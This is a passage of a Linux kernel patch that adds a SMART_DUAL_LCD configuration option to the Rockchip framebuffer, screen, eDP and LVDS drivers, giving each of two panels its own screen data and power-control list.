help            select y if android support three buffer,like Jelly Bean +config SMART_DUAL_LCD+    bool&quot;smart dual lcd support&quot;+    default n  source &quot;drivers/video/rockchip/lcdc/Kconfig&quot; source &quot;drivers/video/rockchip/screen/Kconfig&quot;diff --git a/drivers/video/rockchip/rk_fb.c b/drivers/video/rockchip/rk_fb.cindex c45387c..af30098 100755--- a/drivers/video/rockchip/rk_fb.c+++ b/drivers/video/rockchip/rk_fb.c@@ -71,9 +71,16 @@ EXPORT_SYMBOL(video_data_to_mirroring); extern phys_addr_t uboot_logo_base; extern phys_addr_t uboot_logo_size; extern phys_addr_t uboot_logo_offset;++#ifndef CONFIG_SMART_DUAL_LCD static struct rk_fb_trsm_ops *trsm_lvds_ops; static struct rk_fb_trsm_ops *trsm_edp_ops; static struct rk_fb_trsm_ops *trsm_mipi_ops;+#else+static struct rk_fb_trsm_ops *trsm_prmry_ops;+static struct rk_fb_trsm_ops *trsm_extend_ops;+#endif+ static int uboot_logo_on;  static int rk_fb_debug_lvl;@@ -107,6 +114,7 @@ int rk_fb_get_display_policy(void)  int rk_fb_trsm_ops_register(struct rk_fb_trsm_ops *ops, int type) &#123;+#ifndef CONFIG_SMART_DUAL_LCD     switch (type) &#123;     case SCREEN_RGB:     case SCREEN_LVDS:@@ -127,6 +135,15 @@ int rk_fb_trsm_ops_register(struct rk_fb_trsm_ops *ops, int type)             __func__, type);         break;     &#125;+#else+    if (type == PRMRY)+        trsm_prmry_ops = ops;+    else if (type == EXTEND)+        trsm_extend_ops = ops;+    else+        pr_err(&quot;%s, type:%d\n&quot;, __func__, type);+#endif+     return 0; &#125; @@ -134,6 +151,7 @@ struct rk_fb_trsm_ops *rk_fb_trsm_ops_get(int type) &#123;     struct rk_fb_trsm_ops *ops; +#ifndef CONFIG_SMART_DUAL_LCD     switch (type) &#123;     case SCREEN_RGB:     case SCREEN_LVDS:@@ -155,6 +173,15 @@ struct rk_fb_trsm_ops *rk_fb_trsm_ops_get(int type)             __func__, type);         break;     &#125;+#else+    if (type == PRMRY)+        ops = trsm_prmry_ops;+    else if (type == EXTEND)+        ops = trsm_extend_ops;+    else+        pr_err(&quot;%s, type:%d\n&quot;, __func__, type);+#endif+     return ops; &#125; @@ -309,10 +336,19 @@ static int rk_fb_data_fmt(int data_format, int bits_per_pixel) /*  * rk display power control parse from dts  */+#ifndef CONFIG_SMART_DUAL_LCD int rk_disp_pwr_ctr_parse_dt(struct rk_lcdc_driver *dev_drv)+#else+int rk_disp_pwr_ctr_parse_dt(struct device_node *np, struct rk_screen *rk_screen)+#endif &#123;+#ifndef CONFIG_SMART_DUAL_LCD     struct device_node *root = of_get_child_by_name(dev_drv-&gt;dev-&gt;of_node,                             &quot;power_ctr&quot;);+#else+    struct device_node *root = of_get_child_by_name(np, &quot;power_ctr&quot;);+#endif+     struct device_node *child;     struct rk_disp_pwr_ctr_list *pwr_ctr;     struct list_head *pos;@@ -321,10 +357,20 @@ int rk_disp_pwr_ctr_parse_dt(struct rk_lcdc_driver *dev_drv)     u32 debug = 0;     int ret; +#ifndef CONFIG_SMART_DUAL_LCD     INIT_LIST_HEAD(&amp;dev_drv-&gt;pwrlist_head);+#else+    INIT_LIST_HEAD(rk_screen-&gt;pwrlist_head);+#endif+     if (!root) &#123;+#ifndef CONFIG_SMART_DUAL_LCD         dev_err(dev_drv-&gt;dev, &quot;can&#39;t find power_ctr node for lcdc%d\n&quot;,             dev_drv-&gt;id);+#else+        dev_err(rk_screen-&gt;dev, &quot;can&#39;t find power_ctr node for lcdc%d\n&quot;,+                rk_screen-&gt;lcdc_id);+#endif         return -ENODEV;     &#125; @@ -337,17 +383,29 @@ int rk_disp_pwr_ctr_parse_dt(struct rk_lcdc_driver *dev_drv)                 pwr_ctr-&gt;pwr_ctr.type = GPIO;                 pwr_ctr-&gt;pwr_ctr.gpio = of_get_gpio_flags(child, 0, &amp;flags);                 if (!gpio_is_valid(pwr_ctr-&gt;pwr_ctr.gpio)) &#123;+#ifndef CONFIG_SMART_DUAL_LCD                     dev_err(dev_drv-&gt;dev, &quot;%s ivalid gpio\n&quot;,                         child-&gt;name);+#else+                    dev_err(rk_screen-&gt;dev, &quot;%s ivalid gpio\n&quot;,+                        child-&gt;name);+#endif+                     return -EINVAL;                 &#125;                 pwr_ctr-&gt;pwr_ctr.atv_val = !(flags &amp; OF_GPIO_ACTIVE_LOW);                 ret = gpio_request(pwr_ctr-&gt;pwr_ctr.gpio,                            child-&gt;name);                 if (ret) &#123;+#ifndef CONFIG_SMART_DUAL_LCD                     dev_err(dev_drv-&gt;dev,                         &quot;request %s gpio fail:%d\n&quot;,                         child-&gt;name, ret);+#else+                    dev_err(rk_screen-&gt;dev,+                        &quot;request %s gpio fail:%d\n&quot;,+                        child-&gt;name, ret);+#endif                 &#125;              &#125; else &#123;@@ -356,7 +414,11 @@ int rk_disp_pwr_ctr_parse_dt(struct rk_lcdc_driver *dev_drv)                 ret = of_property_read_string(child, &quot;rockchip,regulator_name&quot;,                                   &amp;(pwr_ctr-&gt;pwr_ctr.rgl_name));                 if (ret || IS_ERR_OR_NULL(pwr_ctr-&gt;pwr_ctr.rgl_name))+#ifndef CONFIG_SMART_DUAL_LCD                     dev_err(dev_drv-&gt;dev, &quot;get regulator name failed!\n&quot;);+#else+                    dev_err(rk_screen-&gt;dev, &quot;get regulator name failed!\n&quot;);+#endif                 if (!of_property_read_u32(child, &quot;rockchip,regulator_voltage&quot;, &amp;val))                     pwr_ctr-&gt;pwr_ctr.volt = val;                 else@@ -368,13 +430,21 @@ int rk_disp_pwr_ctr_parse_dt(struct rk_lcdc_driver *dev_drv)             pwr_ctr-&gt;pwr_ctr.delay = val;         else             pwr_ctr-&gt;pwr_ctr.delay = 0;+#ifndef CONFIG_SMART_DUAL_LCD         list_add_tail(&amp;pwr_ctr-&gt;list, &amp;dev_drv-&gt;pwrlist_head);+#else+       list_add_tail(&amp;pwr_ctr-&gt;list, rk_screen-&gt;pwrlist_head);+#endif     &#125;      of_property_read_u32(root, &quot;rockchip,debug&quot;, &amp;debug);      if (debug) &#123;+#ifndef CONFIG_SMART_DUAL_LCD         list_for_each(pos, &amp;dev_drv-&gt;pwrlist_head) &#123;+#else+       list_for_each(pos, rk_screen-&gt;pwrlist_head) &#123;+#endif             pwr_ctr = list_entry(pos, struct rk_disp_pwr_ctr_list,                          list);             pr_info(&quot;pwr_ctr_name:%s\n&quot;@@ -401,9 +471,25 @@ int rk_disp_pwr_enable(struct rk_lcdc_driver *dev_drv)     struct regulator *regulator_lcd = NULL;     int count = 10; +#ifndef CONFIG_SMART_DUAL_LCD     if (list_empty(&amp;dev_drv-&gt;pwrlist_head))         return 0;-    list_for_each(pos, &amp;dev_drv-&gt;pwrlist_head) &#123;+#else+   if (!dev_drv-&gt;cur_screen-&gt;pwrlist_head) &#123;+       pr_info(&quot;error:  %s, lcdc%d screen pwrlist null\n&quot;,+           __func__, dev_drv-&gt;id);+       return 0;+   &#125;+   if (list_empty(dev_drv-&gt;cur_screen-&gt;pwrlist_head))+       return 0;+#endif++#ifndef CONFIG_SMART_DUAL_LCD+   list_for_each(pos, &amp;dev_drv-&gt;pwrlist_head) +#else+   list_for_each(pos, dev_drv-&gt;cur_screen-&gt;pwrlist_head) +#endif+   &#123;         pwr_ctr_list = list_entry(pos, struct rk_disp_pwr_ctr_list,                       list);         pwr_ctr = &amp;pwr_ctr_list-&gt;pwr_ctr;@@ -446,9 +532,25 @@ int rk_disp_pwr_disable(struct rk_lcdc_driver *dev_drv)     struct regulator *regulator_lcd = NULL;     int count = 10; +#ifndef CONFIG_SMART_DUAL_LCD     if (list_empty(&amp;dev_drv-&gt;pwrlist_head))         return 0;-    list_for_each(pos, &amp;dev_drv-&gt;pwrlist_head) &#123;+#else+   if (!dev_drv-&gt;cur_screen-&gt;pwrlist_head) &#123;+       pr_info(&quot;error:  %s, lcdc%d screen pwrlist null\n&quot;,+           __func__, dev_drv-&gt;id);+       return 0;+   &#125;+   if (list_empty(dev_drv-&gt;cur_screen-&gt;pwrlist_head))+       return 0;+#endif++#ifndef CONFIG_SMART_DUAL_LCD+   list_for_each(pos, &amp;dev_drv-&gt;pwrlist_head) +#else+   list_for_each(pos, dev_drv-&gt;cur_screen-&gt;pwrlist_head) +#endif+   &#123;         pwr_ctr_list = list_entry(pos, struct rk_disp_pwr_ctr_list,                       list);         pwr_ctr = &amp;pwr_ctr_list-&gt;pwr_ctr;@@ -533,7 +635,11 @@ int rk_fb_prase_timing_dt(struct device_node *np, struct rk_screen *screen)         pr_err(&quot;parse display timing err\n&quot;);         return -EINVAL;     &#125;+#ifndef CONFIG_SMART_DUAL_LCD     dt = display_timings_get(disp_timing, disp_timing-&gt;native_mode);+#else+   dt = display_timings_get(disp_timing, screen-&gt;native_mode);+#endif     rk_fb_video_mode_from_timing(dt, screen);      return 0;@@ -1657,8 +1763,14 @@ static void rk_fb_update_win(struct rk_lcdc_driver *dev_drv,                     reg_win_data-&gt;reg_area_data[i].ion_handle;                 win-&gt;area[i].smem_start =                     reg_win_data-&gt;reg_area_data[i].smem_start;+#ifndef CONFIG_SMART_DUAL_LCD+               if (inf-&gt;disp_mode == DUAL ||+                   inf-&gt;disp_mode == NO_DUAL) &#123;+#else                 if (inf-&gt;disp_mode == DUAL ||+                    inf-&gt;disp_mode == DUAL_LCD ||                     inf-&gt;disp_mode == NO_DUAL) &#123;+#endif                     win-&gt;area[i].xpos =                         reg_win_data-&gt;reg_area_data[i].xpos;                     win-&gt;area[i].ypos =@@ -3884,7 +3996,12 @@ static int rk_fb_alloc_buffer(struct fb_info *fbi)         win = dev_drv-&gt;win[win_id];      if (!strcmp(fbi-&gt;fix.id, &quot;fb0&quot;)) &#123;+#ifndef CONFIG_SMART_DUAL_LCD         fb_mem_size = get_fb_size(dev_drv-&gt;reserved_fb);+#else+        fb_mem_size = get_fb_size(dev_drv-&gt;reserved_fb, dev_drv-&gt;cur_screen);+#endif+ #if defined(CONFIG_ION_ROCKCHIP)         if (rk_fb_alloc_buffer_by_ion(fbi, win, fb_mem_size) &lt; 0)             return -ENOMEM;@@ -3906,7 +4023,12 @@ static int rk_fb_alloc_buffer(struct fb_info *fbi)             struct rk_lcdc_driver *dev_drv_prmry;             int win_id_prmry; +#ifndef CONFIG_SMART_DUAL_LCD             fb_mem_size = get_fb_size(dev_drv-&gt;reserved_fb);+#else+            fb_mem_size = get_fb_size(dev_drv-&gt;reserved_fb, dev_drv-&gt;cur_screen);+#endif+ #if defined(CONFIG_ION_ROCKCHIP)             dev_drv_prmry = rk_get_prmry_lcdc_drv();             if (dev_drv_prmry == NULL)@@ -4071,6 +4193,7 @@ static int init_lcdc_device_driver(struct rk_fb *rk_fb,         dev_drv-&gt;area_support[i] = 1;     if (dev_drv-&gt;ops-&gt;area_support_num)         dev_drv-&gt;ops-&gt;area_support_num(dev_drv, dev_drv-&gt;area_support);+#ifndef CONFIG_SMART_DUAL_LCD     rk_disp_pwr_ctr_parse_dt(dev_drv);     if (dev_drv-&gt;prop == PRMRY) &#123;         rk_fb_set_prmry_screen(screen);@@ -4079,6 +4202,11 @@ static int init_lcdc_device_driver(struct rk_fb *rk_fb,     dev_drv-&gt;trsm_ops = rk_fb_trsm_ops_get(screen-&gt;type);     if (dev_drv-&gt;prop != PRMRY)         rk_fb_get_extern_screen(screen);+#else+   rk_fb_set_screen(screen, dev_drv-&gt;prop);+   rk_fb_get_screen(screen, dev_drv-&gt;prop);+   dev_drv-&gt;trsm_ops = rk_fb_trsm_ops_get(dev_drv-&gt;prop);+#endif     dev_drv-&gt;output_color = screen-&gt;color_mode;      return 0;@@ -4419,13 +4547,28 @@ int rk_fb_register(struct rk_lcdc_driver *dev_drv,         struct fb_info *extend_fbi = rk_fb-&gt;fb[dev_drv-&gt;fb_index_base];          extend_fbi-&gt;var.pixclock = rk_fb-&gt;fb[0]-&gt;var.pixclock;+#ifdef CONFIG_SMART_DUAL_LCD+        extend_fbi-&gt;var.xres_virtual = rk_fb-&gt;fb[0]-&gt;var.xres_virtual;+        extend_fbi-&gt;var.yres_virtual = rk_fb-&gt;fb[0]-&gt;var.yres_virtual;+#endif         extend_fbi-&gt;fbops-&gt;fb_open(extend_fbi, 1);         if (dev_drv-&gt;iommu_enabled) &#123;             if (dev_drv-&gt;mmu_dev)                 rockchip_iovmm_set_fault_handler(dev_drv-&gt;dev,                                  rk_fb_sysmmu_fault_handler);+#ifdef CONFIG_SMART_DUAL_LCD+           if (dev_drv-&gt;ops-&gt;mmu_en)+               dev_drv-&gt;ops-&gt;mmu_en(dev_drv);+#endif         &#125;+         rk_fb_alloc_buffer(extend_fbi);+#ifdef CONFIG_SMART_DUAL_LCD+       if (rk_fb-&gt;disp_mode == DUAL_LCD) &#123;+           extend_fbi-&gt;fbops-&gt;fb_set_par(extend_fbi);+           extend_fbi-&gt;fbops-&gt;fb_pan_display(&amp;extend_fbi-&gt;var, extend_fbi);+       &#125;+#endif     &#125; #endif     return 0;diff --git a/drivers/video/rockchip/screen/rk_screen.c b/drivers/video/rockchip/screen/rk_screen.cindex 11ff587..9b1ebc5 100755--- a/drivers/video/rockchip/screen/rk_screen.c+++ b/drivers/video/rockchip/screen/rk_screen.c@@ -4,14 +4,33 @@ #include &quot;lcd.h&quot; #include &quot;../hdmi/rockchip-hdmi.h&quot; +#ifndef CONFIG_SMART_DUAL_LCD static struct rk_screen *rk_screen;+#else+static struct rk_screen *prmry_screen;+static struct rk_screen *extend_screen;++static void rk_screen_info_error(struct rk_screen *screen, int prop)+&#123;+    pr_err(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;error&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\n&quot;);+    pr_err(&quot;&gt;&gt;please init %s screen info in dtsi file&lt;&lt;\n&quot;,+            (prop == PRMRY) ? &quot;prmry&quot; : &quot;extend&quot;);+    pr_err(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;error&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\n&quot;);+&#125;+#endif  int rk_fb_get_extern_screen(struct rk_screen *screen) &#123;+#ifndef CONFIG_SMART_DUAL_LCD     if (unlikely(!rk_screen) || unlikely(!screen))         return -1;-     memcpy(screen, rk_screen, sizeof(struct rk_screen));+#else+   if (unlikely(!extend_screen) || unlikely(!screen))+       return -1;+   memcpy(screen, extend_screen, sizeof(struct rk_screen));+#endif+        screen-&gt;dsp_lut = NULL;     screen-&gt;cabc_lut = NULL;     screen-&gt;type = SCREEN_NULL;@@ -21,13 +40,21 @@ int rk_fb_get_extern_screen(struct rk_screen *screen)  int  rk_fb_get_prmry_screen(struct rk_screen *screen) &#123;+#ifndef CONFIG_SMART_DUAL_LCD     if (unlikely(!rk_screen) || unlikely(!screen))         return -1;      memcpy(screen, rk_screen, sizeof(struct rk_screen));+#else+   if (unlikely(!prmry_screen) || unlikely(!screen))+       return -1;+   memcpy(screen, prmry_screen, sizeof(struct rk_screen));++#endif     return 0; &#125; +#ifndef CONFIG_SMART_DUAL_LCD int rk_fb_set_prmry_screen(struct rk_screen *screen) &#123;     if (unlikely(!rk_screen) || unlikely(!screen))@@ -43,19 +70,87 @@ int rk_fb_set_prmry_screen(struct rk_screen *screen)     rk_screen-&gt;overscan.bottom = screen-&gt;overscan.left;     return 0; &#125;+#else+int rk_fb_get_screen(struct rk_screen *screen, int prop)+&#123;+   struct rk_screen *cur_screen = NULL;+   +   if (unlikely(!screen))+       return -1;+   if (prop == PRMRY) &#123;+       if (unlikely(!prmry_screen)) &#123;+           rk_screen_info_error(screen, prop);+           return -1;+       &#125;+       cur_screen = prmry_screen;+   &#125; else &#123;+       if (unlikely(!extend_screen)) &#123;+           rk_screen_info_error(screen, prop);+           return -1;+       &#125;+       cur_screen = extend_screen;+   &#125;++   memcpy(screen, cur_screen, sizeof(struct rk_screen));++   return 0;++&#125;+int rk_fb_set_screen(struct rk_screen *screen, int prop)+&#123;+    struct rk_screen *cur_screen = NULL;++    if (unlikely(!screen))+        return -1;+    if (prop == PRMRY) &#123;+        if (unlikely(!prmry_screen)) &#123;+            rk_screen_info_error(screen, prop);+            return -1;+        &#125;+        cur_screen = prmry_screen;+    &#125; else &#123;+        if (unlikely(!extend_screen)) &#123;+            rk_screen_info_error(screen, prop);+            return -1;+        &#125;+        cur_screen = extend_screen;+    &#125;++    cur_screen-&gt;lcdc_id = screen-&gt;lcdc_id;+    cur_screen-&gt;screen_id = screen-&gt;screen_id;+    cur_screen-&gt;x_mirror = screen-&gt;x_mirror;+    cur_screen-&gt;y_mirror = screen-&gt;y_mirror;+    cur_screen-&gt;overscan.left = screen-&gt;overscan.left;+    cur_screen-&gt;overscan.top = screen-&gt;overscan.left;+    cur_screen-&gt;overscan.right = screen-&gt;overscan.left;+    cur_screen-&gt;overscan.bottom = screen-&gt;overscan.left;++    return 0;+&#125; +#endif++#ifndef CONFIG_SMART_DUAL_LCD size_t get_fb_size(u8 reserved_fb)+#else+size_t get_fb_size(u8 reserved_fb, struct rk_screen *screen)+#endif &#123;     size_t size = 0;     u32 xres = 0;     u32 yres = 0; +#ifndef CONFIG_SMART_DUAL_LCD     if (unlikely(!rk_screen))         return 0;-     xres = rk_screen-&gt;mode.xres;     yres = rk_screen-&gt;mode.yres;-+#else+   if (unlikely(!screen))+       return 0;+   xres = screen-&gt;mode.xres;+   yres = screen-&gt;mode.yres;+#endif     /* align as 64 bytes(16*4) in an odd number of times */     xres = ALIGN_64BYTE_ODD_TIMES(xres, ALIGN_PIXEL_64BYTE_RGB8888);     if (reserved_fb == ONE_FB_BUFFER)@@ -75,12 +170,19 @@ size_t get_fb_size(u8 reserved_fb) static int rk_screen_probe(struct platform_device *pdev) &#123;     struct device_node *np = pdev-&gt;dev.of_node;-    int ret; +#ifndef CONFIG_SMART_DUAL_LCD+   int ret;+#else+   struct device_node *screen_np;+   struct rk_screen *rk_screen;+   int ret, screen_prop;+#endif     if (!np) &#123;         dev_err(&amp;pdev-&gt;dev, &quot;Missing device tree node.\n&quot;);         return -EINVAL;     &#125;+#ifndef CONFIG_SMART_DUAL_LCD     rk_screen = devm_kzalloc(&amp;pdev-&gt;dev,             sizeof(struct rk_screen), GFP_KERNEL);     if (!rk_screen) &#123;@@ -91,6 +193,43 @@ static int rk_screen_probe(struct platform_device *pdev)     dev_info(&amp;pdev-&gt;dev, &quot;rockchip screen probe %s\n&quot;,                 ret ? &quot;failed&quot; : &quot;success&quot;);     return ret;+#else+   for_each_child_of_node(np, screen_np) &#123;+       rk_screen = devm_kzalloc(&amp;pdev-&gt;dev,+                    sizeof(struct rk_screen), GFP_KERNEL);+       if (!rk_screen) &#123;+           dev_err(&amp;pdev-&gt;dev, &quot;kmalloc for rk screen fail!&quot;);+           return  -ENOMEM;+       &#125;+       rk_screen-&gt;pwrlist_head = devm_kzalloc(&amp;pdev-&gt;dev,+               sizeof(struct list_head), GFP_KERNEL);+       if (!rk_screen-&gt;pwrlist_head) &#123;+           dev_err(&amp;pdev-&gt;dev, &quot;kmalloc for rk_screen pwrlist_head fail!&quot;);+           return  -ENOMEM;+       &#125;+       of_property_read_u32(screen_np, &quot;screen_prop&quot;, &amp;screen_prop);+       if (screen_prop == PRMRY)+           prmry_screen = rk_screen;+       else if (screen_prop == EXTEND)+           extend_screen = rk_screen;+       else+           dev_err(&amp;pdev-&gt;dev, &quot;unknow screen prop: %d\n&quot;,+               screen_prop);+       rk_screen-&gt;prop = screen_prop;+       of_property_read_u32(screen_np, &quot;native-mode&quot;, &amp;rk_screen-&gt;native_mode);+       rk_screen-&gt;dev = &amp;pdev-&gt;dev;+       ret = rk_fb_prase_timing_dt(screen_np, rk_screen);+       pr_info(&quot;%s screen timing parse %s\n&quot;,+           (screen_prop == PRMRY) ? &quot;prmry&quot; : &quot;extend&quot;,+           ret ? &quot;failed&quot; : &quot;success&quot;);+       ret = rk_disp_pwr_ctr_parse_dt(screen_np, rk_screen);+       pr_info(&quot;%s screen power ctrl parse %s\n&quot;,+           (screen_prop == PRMRY) ? &quot;prmry&quot; : &quot;extend&quot;,+           ret ? &quot;failed&quot; : &quot;success&quot;);+   &#125;+   dev_info(&amp;pdev-&gt;dev, &quot;rockchip screen probe success\n&quot;);+   return 0;+#endif &#125;  static const struct of_device_id rk_screen_dt_ids[] = &#123;diff --git a/drivers/video/rockchip/transmitter/rk32_dp.c b/drivers/video/rockchip/transmitter/rk32_dp.cindex 2b3457c..9ae99cc 100755--- a/drivers/video/rockchip/transmitter/rk32_dp.c+++ b/drivers/video/rockchip/transmitter/rk32_dp.c@@ -119,7 +119,11 @@ static int rk32_edp_init_edp(struct rk32_edp *edp)     struct rk_screen *screen = &amp;edp-&gt;screen;     u32 val = 0; +#ifndef CONFIG_SMART_DUAL_LCD     rk_fb_get_prmry_screen(screen);+#else+   rk_fb_get_screen(screen, edp-&gt;prop);+#endif      if (cpu_is_rk3288()) &#123;         if (screen-&gt;lcdc_id == 1)  /*select lcdc*/@@ -1712,17 +1716,25 @@ static int rk32_edp_probe(struct platform_device *pdev)     struct resource *res;     struct device_node *np = pdev-&gt;dev.of_node;     int ret;-+#ifdef CONFIG_SMART_DUAL_LCD+   int prop;+#endif     if (!np) &#123;         dev_err(&amp;pdev-&gt;dev, &quot;Missing device tree node.\n&quot;);         return -EINVAL;     &#125;-+#ifdef CONFIG_SMART_DUAL_LCD+   of_property_read_u32(np, &quot;prop&quot;, &amp;prop);+   pr_info(&quot;Use EDP as %s screen\n&quot;, (prop == PRMRY) ? &quot;primary&quot; : &quot;extend&quot;);+#endif     edp = devm_kzalloc(&amp;pdev-&gt;dev, sizeof(struct rk32_edp), GFP_KERNEL);     if (!edp) &#123;         dev_err(&amp;pdev-&gt;dev, &quot;no memory for state\n&quot;);         return -ENOMEM;     &#125;+#ifdef CONFIG_SMART_DUAL_LCD+    edp-&gt;prop = prop;+#endif     edp-&gt;dev = &amp;pdev-&gt;dev;     edp-&gt;video_info.h_sync_polarity    = 0;     edp-&gt;video_info.v_sync_polarity    = 0;@@ -1734,7 +1746,11 @@ static int rk32_edp_probe(struct platform_device *pdev)      edp-&gt;video_info.link_rate    = LINK_RATE_1_62GBPS;     edp-&gt;video_info.lane_count    = LANE_CNT4;+#ifndef CONFIG_SMART_DUAL_LCD     rk_fb_get_prmry_screen(&amp;edp-&gt;screen);+#else+    rk_fb_get_screen(&amp;edp-&gt;screen, prop);+#endif     if (edp-&gt;screen.type != SCREEN_EDP) &#123;         dev_err(&amp;pdev-&gt;dev, &quot;screen is not edp!\n&quot;);         return -EINVAL;@@ -1809,7 +1825,11 @@ static int rk32_edp_probe(struct platform_device *pdev)     if (!support_uboot_display())         rk32_edp_clk_disable(edp);     rk32_edp = edp;+#ifndef CONFIG_SMART_DUAL_LCD     rk_fb_trsm_ops_register(&amp;trsm_edp_ops, SCREEN_EDP);+#else+    rk_fb_trsm_ops_register(&amp;trsm_edp_ops, prop);+#endif #if defined(CONFIG_DEBUG_FS)     edp-&gt;debugfs_dir = debugfs_create_dir(&quot;edp&quot;, NULL);     if (IS_ERR(edp-&gt;debugfs_dir)) &#123;diff --git a/drivers/video/rockchip/transmitter/rk32_dp.h b/drivers/video/rockchip/transmitter/rk32_dp.hindex 08347b5..cd1b3d9 100755--- a/drivers/video/rockchip/transmitter/rk32_dp.h+++ b/drivers/video/rockchip/transmitter/rk32_dp.h@@ -566,6 +566,9 @@ struct rk32_edp &#123;     bool clk_on;     bool edp_en;     struct dentry *debugfs_dir;+#ifdef CONFIG_SMART_DUAL_LCD+    int prop;+#endif &#125;;  @@ -663,4 +666,4 @@ int rk32_edp_wait_hw_lt_done(struct rk32_edp *edp); enum dp_irq_type rk32_edp_get_irq_type(struct rk32_edp *edp); void rk32_edp_clear_hotplug_interrupts(struct rk32_edp *edp); -#endif\ No newline at end of file+#endifdiff --git a/drivers/video/rockchip/transmitter/rk32_lvds.c b/drivers/video/rockchip/transmitter/rk32_lvds.cindex d0a8b7a..433b858 100644--- a/drivers/video/rockchip/transmitter/rk32_lvds.c+++ b/drivers/video/rockchip/transmitter/rk32_lvds.c@@ -59,8 +59,11 @@ static int rk32_lvds_en(void)     u32 h_bp = 0;     u32 val = 0; +#ifndef CONFIG_SMART_DUAL_LCD     rk_fb_get_prmry_screen(screen);-+#else+    rk_fb_get_screen(screen, lvds-&gt;prop);+#endif     /* enable clk */     rk32_lvds_clk_enable(lvds); @@ -141,18 +144,29 @@ static int rk32_lvds_probe(struct platform_device *pdev)     struct resource *res;     struct device_node *np = pdev-&gt;dev.of_node; +#ifdef CONFIG_SMART_DUAL_LCD+   int prop;+#endif     if (!np) &#123;         dev_err(&amp;pdev-&gt;dev, &quot;Missing device tree node.\n&quot;);         return -EINVAL;     &#125; +#ifdef CONFIG_SMART_DUAL_LCD+   of_property_read_u32(np, &quot;prop&quot;, &amp;prop);+   pr_info(&quot;Use LVDS as %s screen\n&quot;, (prop == PRMRY) ? &quot;prmry&quot;:&quot;extend&quot;);+#endif     lvds = devm_kzalloc(&amp;pdev-&gt;dev, sizeof(struct rk32_lvds), GFP_KERNEL);     if (!lvds) &#123;         dev_err(&amp;pdev-&gt;dev, &quot;no memory for state\n&quot;);         return -ENOMEM;     &#125;     lvds-&gt;dev = &amp;pdev-&gt;dev;+#ifndef CONFIG_SMART_DUAL_LCD     rk_fb_get_prmry_screen(&amp;lvds-&gt;screen);+#else+   rk_fb_get_screen(&amp;lvds-&gt;screen, prop);+#endif     if ((lvds-&gt;screen.type != SCREEN_RGB) &amp;&amp;          (lvds-&gt;screen.type != SCREEN_LVDS) &amp;&amp;         (lvds-&gt;screen.type != SCREEN_DUAL_LVDS) &amp;&amp;@@ -185,7 +199,12 @@ static int rk32_lvds_probe(struct platform_device *pdev)     &#125;      rk32_lvds = lvds;+#ifndef CONFIG_SMART_DUAL_LCD     rk_fb_trsm_ops_register(&amp;trsm_lvds_ops,SCREEN_LVDS);+#else+   lvds-&gt;prop = prop;+   rk_fb_trsm_ops_register(&amp;trsm_lvds_ops, prop);+#endif     dev_info(&amp;pdev-&gt;dev, &quot;rk32 lvds driver probe success\n&quot;);      return 0;diff --git a/drivers/video/rockchip/transmitter/rk32_lvds.h b/drivers/video/rockchip/transmitter/rk32_lvds.hindex ca424a7..6dec093 100755--- a/drivers/video/rockchip/transmitter/rk32_lvds.h+++ b/drivers/video/rockchip/transmitter/rk32_lvds.h@@ -34,6 +34,9 @@ struct rk32_lvds &#123;     struct clk              *pd;     struct rk_screen    screen;     bool            clk_on;+#ifdef CONFIG_SMART_DUAL_LCD+   int prop;+#endif &#125;;  static int inline lvds_writel(struct rk32_lvds *lvds, u32 offset, u32 val)diff --git a/include/dt-bindings/rkfb/rk_fb.h b/include/dt-bindings/rkfb/rk_fb.hindex 6d75770..8b2ac5b 100755--- a/include/dt-bindings/rkfb/rk_fb.h+++ b/include/dt-bindings/rkfb/rk_fb.h@@ -12,6 +12,9 @@ #define NO_DUAL        0 #define ONE_DUAL    1 #define DUAL        2+#define DUAL_LCD    3+#define DEFAULT_MODE    0+ /******************************************************************** **          display output interface supported by rockchip       ** ********************************************************************/diff --git a/include/linux/rk_fb.h b/include/linux/rk_fb.hindex 62647a9..386cd14 100755--- a/include/linux/rk_fb.h+++ b/include/linux/rk_fb.h@@ -808,11 +808,25 @@ extern int rk_fb_register(struct rk_lcdc_driver *dev_drv,                 struct rk_lcdc_win *win, int id); extern int rk_fb_unregister(struct rk_lcdc_driver *dev_drv); extern struct rk_lcdc_driver *rk_get_lcdc_drv(char *name);+#ifndef CONFIG_SMART_DUAL_LCD extern int rk_fb_get_extern_screen(struct rk_screen *screen);+#endif extern int rk_fb_get_prmry_screen( struct rk_screen *screen);+#ifndef CONFIG_SMART_DUAL_LCD extern int rk_fb_set_prmry_screen(struct rk_screen *screen);+#endif++#ifdef CONFIG_SMART_DUAL_LCD+extern int rk_fb_get_screen(struct rk_screen *screen, int prop);+extern int rk_fb_set_screen(struct rk_screen *screen, int prop);+#endif+ extern u32 rk_fb_get_prmry_screen_pixclock(void);+#ifndef CONFIG_SMART_DUAL_LCD extern int rk_disp_pwr_ctr_parse_dt(struct rk_lcdc_driver *dev_drv);+#else+extern int rk_disp_pwr_ctr_parse_dt(struct device_node *np, struct rk_screen *rk_screen);+#endif extern int rk_disp_pwr_enable(struct rk_lcdc_driver *dev_drv); extern int rk_disp_pwr_disable(struct rk_lcdc_driver *dev_drv); extern bool is_prmry_rk_lcdc_registered(void);diff --git a/include/linux/rk_screen.h b/include/linux/rk_screen.hindex af0ffe7..a78f3ae 100644--- a/include/linux/rk_screen.h+++ b/include/linux/rk_screen.h@@ -61,6 +61,13 @@ struct overscan &#123; *ft: the time need to display one frame time */ struct rk_screen &#123;+#ifdef CONFIG_SMART_DUAL_LCD+   struct device   *dev;+   int prop;+   struct list_head *pwrlist_head;+   int native_mode;+#endif+     u16 type;     u16 lvds_format;      u16 face;@@ -144,8 +151,12 @@ struct rk29fb_info &#123; &#125;;  extern void set_lcd_info(struct rk_screen *screen, struct rk29lcd_info *lcd_info);+#ifndef CONFIG_SMART_DUAL_LCD extern size_t get_fb_size(u8 reserved_fb);-+#else+extern size_t get_fb_size(u8 reserved_fb, struct rk_screen *screen);+extern size_t get_rotate_fb_size(struct rk_screen *screen);+#endif extern void set_tv_info(struct rk_screen *screen); extern void 